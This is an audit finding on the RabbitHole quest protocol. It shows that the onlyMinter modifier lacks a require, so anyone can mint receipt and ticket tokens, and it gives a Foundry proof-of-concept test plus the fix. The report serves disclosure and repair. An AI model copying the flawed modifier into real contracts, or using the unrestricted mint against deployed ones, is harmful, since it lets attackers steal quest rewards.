@@ -1,0 +1,22 @@
+[H-01] Bad implementation in minter access control forRabbitHoleReceiptandRabbitHoleTicketscontracts
+Submitted byadriro, also found bybtk,luxartvinsec,KrisApostolov,Garrett,AlexCzm,Aymen0909,AlexCzm,Deivitto,petersspetrov,Josiah,c3phas,hansfriese,fellows,vagrant,sakshamguruji,yosuke,rbserver,rbserver,tsvetanovv,Kenshin,pfapostol,Awesome,7siech,gzeon,gzeon,oberon,Jayus,pavankv,ElKu,ElKu,xAriextz,xAriextz,shark,RaymondFam,paspe,paspe,amaechieth,SovaSlava,DimitarDimitrov,vanko1,codeislight,0xMirce,trustindistrust,navinavu,UdarTeam,AkshaySrivastav,Timenov,0xMAKEOUTHILL,prestoncodes,millersplanet,millersplanet,UdarTeam,usmannk,navinavu,Cryptor,frankudoags,mookimgo, andthekmj
+https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50
+BothRabbitHoleReceiptandRabbitHoleTicketscontracts define amintfunction that is protected by aonlyMintermodifier:
+RabbitHoleReceipt:
+https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104
+functionmint(addressto_,stringmemoryquestId_)publiconlyMinter{_tokenIds.increment();uintnewTokenID=_tokenIds.current();questIdForTokenId[newTokenID] =questId_;timestampForTokenId[newTokenID] =block.timestamp;_safeMint(to_,newTokenID);}
+RabbitHoleTickets:
+https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85
+functionmint(addressto_,uint256id_,uint256amount_,bytesmemorydata_)publiconlyMinter{_mint(to_,id_,amount_,data_);}
+However, in both cases the modifier implementation is flawed as there isn’t any check for a require or revert, the comparison will silently return false and let the execution continue:
+modifieronlyMinter() {msg.sender==minterAddress;_;}
+Impact
+Any account can mint any number ofRabbitHoleReceiptandRabbitHoleTicketstokens.
+This represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.
+Proof of Concept
+The following test demonstrates the issue.
+contractAuditTestisTest{addressdeployer;uint256signerPrivateKey;addresssigner;addressroyaltyRecipient;addressminter;addressprotocolFeeRecipient;QuestFactoryfactory;ReceiptRendererreceiptRenderer;RabbitHoleReceiptreceipt;TicketRendererticketRenderer;RabbitHoleTicketstickets;ERC20token;functionsetUp()public{deployer=makeAddr("deployer");signerPrivateKey=0x123;signer=vm.addr(signerPrivateKey);vm.label(signer,"signer");royaltyRecipient=makeAddr("royaltyRecipient");minter=makeAddr("minter");protocolFeeRecipient=makeAddr("protocolFeeRecipient");vm.startPrank(deployer);// ReceiptreceiptRenderer=newReceiptRenderer();RabbitHoleReceiptreceiptImpl=newRabbitHoleReceipt();receipt=RabbitHoleReceipt(address(newERC1967Proxy(address(receiptImpl),"")));receipt.initialize(address(receiptRenderer),royaltyRecipient,minter,0);// factoryQuestFactoryfactoryImpl=newQuestFactory();factory=QuestFactory(address(newERC1967Proxy(address(factoryImpl),"")));factory.initialize(signer,address(receipt),protocolFeeRecipient);receipt.setMinterAddress(address(factory));// ticketsticketRenderer=newTicketRenderer();RabbitHoleTicketsticketsImpl=newRabbitHoleTickets();tickets=RabbitHoleTickets(address(newERC1967Proxy(address(ticketsImpl),"")));tickets.initialize(address(ticketRenderer),royaltyRecipient,minter,0);// ERC20 tokentoken=newERC20("Mock ERC20","MERC20");factory.setRewardAllowlistAddress(address(token),true);vm.stopPrank();}functiontest_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint()public{addressattacker=makeAddr("attacker");vm.startPrank(attacker);// Anyone can freely mint RabbitHoleReceiptstringmemoryquestId="a quest";receipt.mint(attacker,questId);assertEq(receipt.balanceOf(attacker),1);// Anyone can freely mint RabbitHoleTicketsuint256tokenId=0;tickets.mint(attacker,tokenId,1,"");assertEq(tickets.balanceOf(attacker,tokenId),1);vm.stopPrank();}}
+Recommendation
+The modifier should require that the caller is theminterAddressin order to revert the call in case this condition doesn’t hold.
+modifieronlyMinter() {require(msg.sender==minterAddress);_;}
+waynehoover (RabbitHole) confirmed
